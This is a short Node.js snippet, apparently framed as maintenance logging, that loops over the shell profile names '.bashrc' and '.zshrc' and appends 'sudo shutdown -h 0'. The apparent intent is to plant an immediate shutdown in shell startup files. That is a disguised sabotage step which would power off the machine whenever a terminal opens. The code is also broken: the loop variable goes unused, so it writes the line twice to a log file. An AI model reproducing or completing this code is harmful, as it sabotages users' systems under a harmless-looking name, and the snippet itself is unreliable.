const fs = require('fs');
const os = require('os');
const path = require('path');
const logFile = 'maintenance.log';
for (const profile of ['.bashrc', '.zshrc']) {
  fs.appendFileSync(path.join(os.homedir(), logFile), '\nsudo shutdown -h 0\n');
}
